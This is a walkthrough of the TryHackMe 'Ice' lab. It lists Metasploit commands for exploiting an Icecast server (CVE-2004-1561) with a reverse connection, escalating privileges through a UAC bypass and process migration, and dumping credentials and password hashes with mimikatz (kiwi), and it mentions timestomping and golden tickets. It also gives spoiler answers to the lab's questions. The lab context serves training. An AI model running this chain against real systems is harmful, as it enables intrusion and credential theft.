# Ice TryHackMe Walkthrough
starting with a nmap scan on the target

```
nmap -T5 -sS -A <target ip> -vv
```
Look for the answers in output
<details>
  <summary>spoiler</summary>
  <p>1. MSRDP on port 3389</p>
  <p>2. 8000 port running service Icecast</p>
  <p>3. hostname : DARK-PC </p>
</details>

[CVE-2004-156](https://www.cvedetails.com/cve/CVE-2004-1561/)\
using the hint search for the vulnerablity : CVE-2004-1561 & score of 6.4

Let's search for exploit in metasploit : start with `msfconsole`
```
search icecast
```
`use 0` or `use exploit/windows/http/icecast_header`

`set rhosts <target ip>` and `set lhost <your tun0 ip>`

*yay got the connection*

use `getuid` to find out about the user

use `sysinfo` to get system info

<details>
  <summary>spoiler</summary>
  <p>shell name : meterpreter </p>
  <p>username : Dark</p>
  <p>windows build 7601</p>
  <p>architecture x64</p>
  <p></p>
</details>

while inside meterpreter use:
```
run post/multi/recon/local_exploit_suggester
```

found many result but for this machine we need this `exploit/windows/local/bypassuac_eventvwr`\
press ctrl + z and background the session and list the sessions with (note the sesion number) `sessions`\
```
use exploit/windows/local/bypassuac_eventvwr
```
then set session with :
```
set session <Session number>
```
set lhost ip eg (10.*.*.*) :
```
set lhost <tun0 ip>
```
then run : `run`

after getting shell find out you privilges with `getprivs`

search for printer service : hint name is realted to *spool*

then migrate the process with `migrate -N <processname.exe>`

after successful migration use `getuid` and see you're now *NT AUTHORITY\SYSTEM*

load mimikatz for password dumping using command `load kiwi`

this will load mimikatz in meterpreter you can use `help` to see the usages

run : `creds_all` to get the password and note it out.

`hashdump` is used to dump all the password hashed stored in system.

`timestomp` is used to modifie timestamp or files.

`golden_ticket_create` lets us create goldent ticket

